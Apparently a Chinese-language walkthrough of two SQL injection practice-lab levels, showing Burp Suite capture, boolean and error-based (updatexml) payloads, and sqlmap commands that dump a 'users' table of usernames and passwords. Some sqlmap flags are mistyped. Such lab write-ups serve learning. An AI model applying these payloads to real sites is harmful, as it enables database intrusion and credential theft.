例一

这里使用bp抓包

给uname与passwd传值,uname=1”) or 1=1时页面返回正常，所以应为双引号加括号闭合

法一 （手工注入）

输入1”) or length(database())=8#

页面显示正常说明数据库长度为8，输入1”) or ascii(mid(database(),1,1))=115#，通过页面返回的正常与否判断数据库的名称

法二（使用sqlmap）

将用bp抓到的数据包发送到repeat模块后传出数据包保存到文件夹命名为1.text

打开sqlmap 输入 python sqlmap -r “1.text文件的地址” –batch

发现报错，意思是sqlmap没有检测到可注入的参数，可以尝试将level修改为6（默认level=1）

输入 python sqlmap -r “1.text文件的地址” –batch –level=5

得到数据库、PHP、Apache的版本信息，说明存在sql注入

输入python sqlmap.py -r “D:\ygfdgyhdfgddg\1\1.txt” –batch –level=5 –dbs 查询数据库

输入python sqlmap.py -r “D:\ygfdgyhdfgddg\1\1.txt” –batch –level=5 -D security _tables 查询对应数据库的表名

输入python sqlmap.py -r “D:\ygfdgyhdfgddg\1\1.txt” –batch –level=5 -D security -T users –dumb查询数据

例二

这关发现不管怎么在uname注入都没有用，查了一下资料发现这一关的原理是先用select语句搜索用户输入的用户名，有一个check_input函数对用户输入的用户名进行了过滤，所以我们无法在uname字段进行注入，只有select语句生效，也就是搜索到正确的用户名才会执行update语句。

用bp抓包发送到repeater模块

让uname=admin发现，只要passwd不含单引号，页面都返回正常，如果passwd包含单引号，页面报错

通过报错信息判断闭合方式为单引号闭合，尝试报错注入

让passwd=1’ and updatexml(1,concat(1,database()),1)#

让passwd=1’ and updatexml(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema=’security’)),1)#

让passwd=1’ and updatexml(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_name=’users’ )),1)#

让passwd=1’ and updatexml(1,concat(1,(select group_concat(username,id,password) from users)),1)#

发现报错，不知道什么原因

查了一下：当在 MySQL 中执行 UPDATE 或 DELETE 操作时，如果子查询直接引用了目标表，会出现错误：You can’t specify target table ‘sys_campus_bill’ for update in FROM clause。这是因为 MySQL 不允许在同一语句中同时查询和更新同一张表。
